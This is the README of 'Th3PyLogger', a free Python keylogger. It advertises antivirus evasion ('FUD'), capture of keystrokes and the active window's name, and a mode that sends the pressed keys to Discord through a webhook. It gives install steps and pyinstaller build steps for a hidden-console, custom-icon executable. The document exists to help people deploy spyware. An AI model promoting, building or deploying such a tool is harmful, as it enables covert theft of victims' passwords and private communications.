# Th3PyLogger

## ✨ Features
- 🕶️ FUD
- 💰 It's free
- 📃 It's easy to use
- 🛡️ Log to discord
- 💎 One of the best KeyLoggers for free
- 🐍 Only python code
- 🪟 Get top app's name
- 💡 Faster than light
##

### Getting started

#### System requirements
- MS Windows (tested on 10). TODO: test Linux (requires sudo) and macOS support;
- [Python 3](https://www.python.org/downloads/) (tested on v. 3.7.4).

###### **Run as a Python script**
1. `pip install requirements.txt` (alternatively `python -m pip ...`)
2. `python Start.py`
###### **Run as an executable (7 MB)**
1. `pip install pyinstaller`
2. `pyinstaller --onefile --noconsole --icon=icon.ico Start.py`
3. `dist\Start.exe`

##### System arguments
`Start.py mode [encrypt]`
- **modes**:
  - **local:** store the logs in a local txt file. Filename is a MD5 hash of the current date (YYYY-Mon-DD).
  - **debug:** write to the console.
  - **discord:** send the pressed keys to Discord through a webhook
